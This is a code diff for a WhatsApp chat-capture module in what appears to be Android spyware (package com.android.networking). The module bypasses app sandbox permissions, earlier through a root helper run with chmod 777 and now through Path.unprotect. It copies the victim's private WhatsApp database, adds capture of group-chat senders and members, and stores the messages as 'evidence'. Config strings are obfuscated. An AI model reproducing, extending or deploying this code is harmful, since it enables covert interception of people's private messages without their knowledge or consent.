@@ -5,7 +5,9 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.Enumeration;
+import java.util.HashSet;
 import java.util.Hashtable;
+import java.util.Set;
 import java.util.concurrent.Semaphore;
 
 import javax.xml.parsers.DocumentBuilderFactory;
@@ -24,7 +26,9 @@ import com.android.networking.Messages;
 import com.android.networking.ProcessStatus;
 import com.android.networking.auto.Cfg;
 import com.android.networking.db.GenericSqliteHelper;
+import com.android.networking.db.RecordVisitor;
 import com.android.networking.evidence.Markup;
+import com.android.networking.file.Path;
 import com.android.networking.listener.ListenerProcess;
 import com.android.networking.module.ModuleAddressBook;
 import com.android.networking.util.Check;
@@ -33,8 +37,12 @@ import com.android.networking.util.StringUtils;
 public class ChatWhatsapp extends SubModuleChat {
 	private static final String TAG = "ChatWhatsapp";
 
+	final Hashtable<String, String> groups = new Hashtable<String, String>();
+
 	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();
 	private static final int PROGRAM_WHATSAPP = 0x06;
+
+	private static final String DEFAULT_LOCAL_NUMBER = "local";
 	String pObserving = "whatsapp";
 
 	private String myPhoneNumber = "local";
@@ -79,6 +87,11 @@ public class ChatWhatsapp extends SubModuleChat {
 		hastableConversationLastIndex = new Hashtable<String, Integer>();
 		try {
 			myPhoneNumber = readMyPhoneNumber();
+			if (DEFAULT_LOCAL_NUMBER.equals(myPhoneNumber)) {
+				enabled = false;
+				return;
+			}
+
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);
 
 			if (markup.isMarkup()) {
@@ -98,6 +111,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 				readChatMessages();
 			}
+
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart), " + e);
@@ -170,7 +184,7 @@ public class ChatWhatsapp extends SubModuleChat {
 			}
 		}
 
-		return "me";
+		return DEFAULT_LOCAL_NUMBER;
 	}
 
 	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
@@ -197,20 +211,18 @@ public class ChatWhatsapp extends SubModuleChat {
 
 		try {
 			boolean updateMarkup = false;
+
 			// f.0=/data/data/com.whatsapp/databases
 			String dbDir = Messages.getString("f_0");
 			// f.1=/msgstore.db
-			String dbFile = dbDir + Messages.getString("f_1");
-			// changeFilePermission(dbFile,777);
-			// f.2=/system/bin/ntpsvd pzm 777
-			Runtime.getRuntime().exec(Messages.getString("f_2") + dbDir);
-			Runtime.getRuntime().exec(Messages.getString("f_2") + dbFile);
-			File file = new File(dbFile);
-			if (file.canRead()) {
+			String dbFile = Messages.getString("f_1");
+
+			if (Path.unprotect(dbDir, dbFile, true)) {
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatMessages): can read DB");
 				}
-				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFile);
+				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
 				SQLiteDatabase db = helper.getReadableDatabase();
 
 				// retrieve a list of all the conversation changed from the last
@@ -222,6 +234,10 @@ public class ChatWhatsapp extends SubModuleChat {
 				for (Pair<String, Integer> pair : changedConversations) {
 					String conversation = pair.first;
 					int lastReadIndex = pair.second;
+
+					if (isGroup(conversation) && groupTo(conversation) == null) {
+						fetchGroup(db, conversation);
+					}
 
 					int newLastRead = fetchMessages(db, conversation, lastReadIndex);
 
@@ -253,6 +269,36 @@ public class ChatWhatsapp extends SubModuleChat {
 		} finally {
 			readChatSemaphore.release();
 		}
+	}
+
+	private void fetchGroup(SQLiteDatabase db, final String conversation) {
+
+		// f.4=_id
+		// f.5=key_remote_jid
+		// f_f=remote_resources
+		String[] projection = { Messages.getString("f_4"), Messages.getString("f_f") };
+		String selection = Messages.getString("f_5") + "='" + conversation + "'";
+
+		// final Set<String> remotes = new HashSet<String>();
+
+		RecordVisitor visitor = new RecordVisitor(projection, selection) {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				int id = cursor.getInt(0);
+				String remote = cursor.getString(1);
+				// remotes.add(remote);
+				if (remote != null) {
+					groups.put(conversation, clean(remote));
+				}
+				return id;
+			}
+		};
+
+		GenericSqliteHelper helper = new GenericSqliteHelper(db);
+		// f_a = messages
+		helper.traverseRecords(Messages.getString("f_a"), visitor);
+
 	}
 
 	/**
@@ -334,7 +380,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		// receipt_server_timestamp INTEGER, receipt_device_timestamp INTEGER,
 		// raw_data BLOB)
 
-		String peer = conversation.replaceAll(Messages.getString("f_9"), "");
+		String peer = clean(conversation);
 
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		// f.a=messages
@@ -347,7 +393,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		// f_b=timestamp
 		// f_c=key_from_me
 		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_7"),
-				Messages.getString("f_b"), Messages.getString("f_c") };
+				Messages.getString("f_b"), Messages.getString("f_c"), "remote_resource" };
 
 		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation
 		// AND key_remote_jid>$lastReadIndex
@@ -360,23 +406,70 @@ public class ChatWhatsapp extends SubModuleChat {
 			String message = cursor.getString(2); // f_7
 			Long timestamp = cursor.getLong(3); // f_b
 			boolean incoming = cursor.getInt(4) != 1; // f_c
+			String remote = cursor.getString(5);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + message);
 			}
 			lastRead = Math.max(index, lastRead);
-			if (message != null) {
+
+			if (StringUtils.isEmpty(message)) {
+				if (isGroup(conversation) && !StringUtils.isEmpty(remote)) {
+					if (Cfg.DEBUG) {
+						Check.asserts(groupTo(conversation).contains(clean(remote)), "no remote in group: " + remote);
+					}
+				}
+			} else {
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (fetchMessages): " + StringUtils.byteArrayToHexString(message.getBytes()));
 				}
 				String from = incoming ? peer : myPhoneNumber;
 				String to = incoming ? myPhoneNumber : peer;
-				messages.add(new MessageChat(PROGRAM_WHATSAPP, new Date(timestamp), from, to, message, incoming));
 
+				if (isGroup(peer)) {
+					if (incoming) {
+						from = remote;
+					} else {
+						to = groupTo(peer);
+					}
+				}
+				messages.add(new MessageChat(PROGRAM_WHATSAPP, new Date(timestamp), from, to, message, incoming));
 			}
+
 		}
 		cursor.close();
 		getModule().saveEvidence(messages);
 		return lastRead;
+	}
+
+	private String clean(String remote) {
+		// f_9=@s.whatsapp.net
+		return remote.replaceAll(Messages.getString("f_9"), "");
+	}
+
+	private String groupTo(String peer) {
+		return groups.get(peer);
+	}
+
+	private void addGroup(String peer, String remote) {
+		if (Cfg.DEBUG) {
+			Check.requires(isGroup(peer), "peer is not a group: " + peer);
+		}
+		String value;
+		if (groups.containsKey(peer)) {
+			value = groups.get(peer);
+			value += "," + clean(remote);
+
+		} else {
+			value = remote;
+		}
+
+		groups.put(peer, value);
+	}
+
+	private boolean isGroup(String peer) {
+
+		return peer.contains("@g.");
 	}
 
 }
